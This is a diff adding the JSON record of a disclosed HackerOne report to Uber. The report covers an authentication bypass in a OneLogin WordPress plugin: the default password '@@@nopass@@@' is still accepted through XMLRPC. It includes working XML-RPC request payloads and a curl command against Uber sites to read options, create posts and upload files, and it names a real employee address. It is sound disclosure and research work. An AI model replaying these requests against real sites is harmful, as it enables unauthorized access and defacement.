@@ -1,0 +1,113 @@
+{
+  "id": 138869,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzg4Njk=",
+  "url": "https://hackerone.com/reports/138869",
+  "title": "OneLogin authentication bypass on WordPress sites via XMLRPC",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-15T00:03:20.825Z",
+  "submitted_at": "2016-05-15T00:03:20.825Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jouko",
+    "url": "/jouko",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mqyrwb0f5m6e7yq17l0nrhhz32yw/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 314,
+    "url": "https://hackerone.com/uber",
+    "handle": "uber",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Uber",
+      "twitter_handle": "",
+      "website": "https://www.uber.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-07-15T22:04:09.271Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-28T17:35:32.085Z",
+  "team_member_agreed_on_going_public_at": "2016-07-15T22:04:09.137Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password `@@@nopass@@@`. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't.\n\nThe OneLogin plugin does prevent logins through the normal *wp-login.php* page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: `wp-login.php?normal=1`. The settings did not allow this on the Uber sites I tried.\n\nAn attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven't done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).\n\nThis probably affects most of your WordPress sites. I've confirmed this on *love.uber.com* and *newsroom.uber.com* by creating pages and posts (not public) and uploading files.\n\nThe XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:\n~~~~\nwp.deleteFile\nwp.editComment\nwp.getOptions\nwp.getUsers\nwp.newPage\nwp.newPost\nwp.setOptions\nwp.uploadFile\n~~~~\n#Reproducing#\nCreate an XML file named `options.xml` containing:\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>wp.getOptions</methodName>\n<params>\n\t<param><value>zzz</value></param>\n        <param><value>cbarry@uber.com</value></param>\n        <param><value>@@@nopass@@@</value></param>\n</params>\n</methodCall>\n~~~~\nRun the UNIX command:\n~~~~ sh\ncurl 'https://newsroom.uber.com/xmlrpc.php' --data-binary \"`cat options.xml`\" -H 'Content-type: application/xml'\n~~~~\nYou should get the response:\n~~~~ xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n      <struct>\n  <member><name>software_name</name><value><struct>\n  <member><name>desc</name><value><string>Software Name</string></value></member>\n  <member><name>readonly</name><value><boolean>1</boolean></value></member>\n  <member><name>value</name><value><string>WordPress</string></value></member>\n</struct></value></member>\n  <member><name>software_version</name><value><struct>\n  <member><name>desc</name><value><string>Software Version</string></value></member>\n  <member><name>readonly</name><value><boolean>1</boolean></value></member>\n  <member><name>value</name><value><string>4.4.3</string></value></member>\n</struct></value></member>\n  <member><name>blog_url</name><value><struct>\n  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>\n  <member><name>readonly</name><value><boolean>1</boolean></value></member>\n  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>\n...etc.\n~~~~\n#Exploit scenarios#\nOptions in the above output that aren't marked *readonly* can also be changed. I didn't check if this is exploitable.\n\nFor usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn't have this information.\n\nA new post can be created with the following request. Without supplying a `post_status` parameter it will be saved as a draft, otherwise it will be published. It's also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user's privileges.\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>wp.newPost</methodName>\n<params>\n        <param><value>what is this parameter</value></param>\n        <param><value>(INSERT USERNAME)</value></param>\n        <param><value>@@@nopass@@@</value></param>\n        <param><struct>\n                <member><name>post_title</name><value>bugbounty test post</value></member>\n                <member><name>post_content</name><value>any HTML content here</value></member>\n                <member><name>post_excerpt</name><value>excerpt</value></member>\n        </struct></param>\n</params>\n</methodCall>\n~~~~\nI've created some pages/posts on the said systems. As I saved them as drafts they can't be seen by normal users, but should be visible to administrators:\n* https://love.uber.com/australia/?page_id=6085\n* https://newsroom.uber.com/us-new-york/?p=2567\n\nA file can be uploaded with a request like this:\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>metaWeblog.newMediaObject</methodName>\n<params>\n        <param><value>what is this parameter</value></param>\n        <param><value>(INSERT USERNAME)</value></param>\n        <param><value>@@@nopass@@@</value></param>\n        <param><struct>\n                <member><name>name</name><value>file_name.html</value></member>\n                <member><name>type</name><value>text/plain</value></member>\n                <member><name>bits</name><value>file contents, any data format XML-encoded</value></member>\n        </struct></param>\n</params>\n</methodCall>\n~~~~\nThe ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.\n\nAs a PoC I uploaded a file: https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key\nI tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user's privileges, this may be used to perform various attacks such as XSS via *.html or *.swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables. ",
+  "bounty_amount": "7000.0",
+  "formatted_bounty": "$7,000",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-07-28T17:35:32.175Z",
+  "allow_singular_disclosure_after": -238098931.1692875,
+  "singular_disclosure_allowed": true,
+  "vote_count": 72,
+  "voters": [
+    "r3l1c",
+    "n1m0",
+    "p1stachios",
+    "shailesh4594",
+    "bobrov",
+    "hunter",
+    "michiel",
+    "wkcaj",
+    "sameerphad72",
+    "metawolf",
+    "and 62 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
